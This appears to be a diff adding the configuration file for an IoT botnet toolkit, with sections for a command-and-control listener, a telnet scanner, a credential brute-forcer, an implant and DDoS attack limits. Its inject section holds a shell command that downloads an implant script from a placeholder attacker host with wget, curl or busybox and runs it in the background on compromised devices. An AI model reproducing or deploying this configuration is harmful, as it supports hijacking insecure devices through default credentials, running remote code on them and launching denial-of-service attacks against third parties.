@@ -1,0 +1,35 @@
+c2:
+  bind: "0.0.0.0"
+  port: 4444
+  store_root: "output"
+
+scanner:
+  port: 23
+  timeout: 5
+  threads: 200
+  output: "output/open_telnet.txt"
+
+brute:
+  threads: 50
+  timeout: 5
+  prompt_delay: 1.0
+  creds_file: "data/creds.txt"
+  output: "output/hits.txt"
+
+inject:
+  download_url: "http://YOUR_PUBLIC_IP:8000/implant.sh"
+  inject_command: >
+    cd /tmp || cd /var/tmp || cd /dev;
+    (wget -qO implant.sh {url} || curl -s -o implant.sh {url} || busybox wget -qO implant.sh {url});
+    chmod +x implant.sh; ./implant.sh &
+
+implant:
+  c2_host: "YOUR_PUBLIC_IP"
+  c2_port: 4444
+  output: "payloads/implant.sh"
+
+ddos:
+  default_duration: 60
+  default_threads: 200
+  max_duration: 3600
+  max_threads: 2000
